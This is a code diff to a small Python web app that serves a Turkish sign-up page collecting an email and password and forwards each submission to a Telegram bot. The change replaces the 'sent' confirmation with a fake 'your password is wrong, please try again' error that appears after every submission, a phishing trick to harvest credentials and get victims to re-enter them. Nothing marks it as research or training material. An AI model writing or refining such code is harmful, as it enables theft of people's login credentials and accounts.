@@ -73,6 +73,14 @@ def home():
             button:hover {
                 background: #333;
             }
+
+            #error {
+                display: none;
+                color: red;
+                margin-top: 15px;
+                font-size: 15px;
+                font-weight: bold;
+            }
         </style>
     </head>
 
@@ -82,14 +90,19 @@ def home():
             <h2>Kayit ol</h2>
 
             <input id="f1" placeholder="example@gmail.com">
-            <input id="f2" placeholder="pasword">
+            <input id="f2" type="password" placeholder="password">
 
             <button onclick="send()">Kayit ol</button>
+
+            <p id="error">
+                Şifreniz yanlış lütfen tekrar deneyin
+            </p>
         </div>
 
         <script>
-        function send(){
-            fetch("/send", {
+        async function send(){
+
+            await fetch("/send", {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
@@ -98,7 +111,8 @@ def home():
                 })
             });
 
-            alert("Gönderildi");
+            // Kırmızı hata mesajını göster
+            document.getElementById("error").style.display = "block";
         }
         </script>
 
@@ -118,6 +132,7 @@ def send(data: Form):
 """
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
     requests.post(url, data={
         "chat_id": CHAT_ID,
         "text": text
